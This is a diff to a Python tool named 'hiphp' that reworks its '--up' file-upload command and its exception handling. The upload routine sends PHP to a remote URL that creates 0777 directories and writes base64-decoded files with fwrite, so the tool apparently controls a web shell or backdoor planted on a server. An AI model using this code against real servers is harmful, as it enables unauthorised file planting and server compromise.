@@ -142,13 +142,17 @@ class hiphp:
                 print(hiphp.run_file(self,varss[1],varss[2:]))
             #up
             elif command[0:4]=="--up":
-                try:
-                    file_path,to=command[5:len(command)].split(" ")
+                v=command[5:].split(" ")
+                if len(v)>1:
+                #try:
+                    file_path=v[0]
+                    to=v[1]
                     if to[len(to)-1:len(to)]!="/":
                         to=to+"/"
-                    hiphp.upload(self,file_path,to)
-                except ZeroDivisionError:
-                    hiphp.upload(self,command[5:len(command)])
+                    hiphp.upload(self,file_path,to)                    
+                #except:
+                else:
+                    hiphp.upload(self,command[5:].split(" ")[0])
             else:
                 hiphp.do(self,self.key,self.url,self.headers,False,command)
         else:
@@ -236,7 +240,7 @@ class hiphp:
                     p="./"
                 hiphp.run(self,"if(!file_exists('"+p+to+"')){mkdir('"+p+to+"',0777,true);}")
             hiphp.run(self,f'Fwrite(fopen("{p+to+os.path.basename(path_to_upluad)}","w+"),base64_decode("{encoded_string}"));')
-        except ZeroDivisionError:
+        except:
             self.color2.c(f"{emsg_5} '{path_to_upluad}'.",self.c_red)
 
     #get the hole:
